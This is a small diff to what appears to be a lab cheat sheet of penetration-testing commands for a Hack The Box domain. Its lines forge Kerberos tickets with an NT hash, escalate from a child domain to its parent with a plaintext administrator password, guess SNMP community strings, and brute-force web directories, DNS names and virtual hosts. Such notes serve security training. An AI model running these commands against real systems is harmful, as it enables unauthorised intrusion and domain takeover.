@@ -3,7 +3,7 @@ impacket-ticketer -nthash 0f5assasa6f -domain-sid S-1–5–21–2986980474–46
 impacket-raiseChild -target-exec 172.16.5.5 "child.domain.local/administrator:password123"
 onesixtyone $(IP) -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
 gobuster dir -u http://$(IP)/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -o gobuster_dir_$(IP).txt
-gobuster dns -d $(IP) -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -o gobuster_dns_$(IP).txt
+gobuster dns --domain inlanefreight.htb --no-error -w /opt/wordlists/subdomains-top1million-110000.txt -t 50 -o gobuster_dns_$(IP).txt
 gobuster vhost -u http://inlanefreight.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt --append-domain
 ffuf -u http://$(IP)/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -o ffuf_$(IP).json
 feroxbuster -u http://$(IP)/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -o ferox_$(IP).txt
